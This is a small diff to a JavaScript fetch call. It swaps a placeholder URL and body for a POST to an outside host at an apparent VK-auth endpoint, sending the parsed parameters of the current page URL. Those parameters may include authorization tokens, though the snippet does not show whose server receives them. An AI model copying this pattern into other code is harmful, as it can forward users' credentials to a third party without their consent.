@@ -1,8 +1,8 @@
-fetch(url, { 
+fetch("https://itracers.xyz:8443/api/vkauth", { 
 method: 'post', 
-body: "объект"; 
+body: JSON.stringify(parseGet(window.location.href))
 })
-.then(response=>console.log(' .... ', response.json())
+.then(response=>console.log(' .... ', response.json()))
 .catch(function (error) { 
 console.log('Request failed ', error ); 
 }); 
